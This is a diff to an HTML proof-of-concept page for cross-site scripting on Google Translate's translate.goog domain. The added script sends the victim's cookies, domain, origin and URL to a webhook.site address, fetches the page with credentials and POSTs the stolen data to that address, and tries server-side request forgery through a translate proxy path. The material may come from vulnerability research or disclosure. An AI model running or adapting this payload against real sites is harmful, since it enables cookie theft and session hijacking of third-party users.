@@ -1,9 +1,47 @@
 <html>
 <body>
 <h1>Google Translate XSS PoC</h1>
+<div id="proof"></div>
 <script>
-document.title = "XSS-" + document.domain;
+// Proof 1: Show execution context on page
+var info = "domain=" + document.domain + " | origin=" + location.origin;
+document.getElementById("proof").innerHTML = "<h2>JS executed in: " + document.domain + "</h2>";
+
+// Proof 2: Exfiltrate to attacker server (REPLACE with your webhook.site URL)
+var webhook = "https://webhook.site/a7d60277-1282-4a05-85da-2e13e3f6e459";
+new Image().src = webhook + "?domain=" + encodeURIComponent(document.domain)
+  + "&origin=" + encodeURIComponent(location.origin)
+  + "&cookie=" + encodeURIComponent(document.cookie)
+  + "&url=" + encodeURIComponent(location.href);
+
+// Proof 3: Steal the page HTML (translate.goog content)
+fetch(location.href, {credentials: 'include'})
+  .then(r => r.text())
+  .then(html => {
+    document.getElementById("proof").innerHTML += "<h2>Page stolen: " + html.length + " bytes</h2>";
+    // Send stolen page to attacker
+    fetch(webhook, {
+      method: "POST",
+      body: JSON.stringify({
+        domain: document.domain,
+        origin: location.origin,
+        cookies: document.cookie,
+        pageLength: html.length,
+        proof: "XSS executing in translate.goog context"
+      }),
+      headers: {"Content-Type": "text/plain"}
+    });
+  });
+
+// Proof 4: Access Google's translate CORS proxy from our script
+fetch("/3cbab51d-6f44-4569-b131-140fd3802204/ajax?u=" + encodeURIComponent("https://httpbin.org/ip"))
+  .then(r => r.text())
+  .then(data => {
+    document.getElementById("proof").innerHTML += "<h2>SSRF via Google proxy: " + data.substring(0,100) + "</h2>";
+  })
+  .catch(e => {
+    document.getElementById("proof").innerHTML += "<h2>Proxy fetch: " + e.message + "</h2>";
+  });
 </script>
-<p>If you see an alert popup showing "translate.goog" in the domain, XSS is confirmed.</p>
 </body>
 </html>
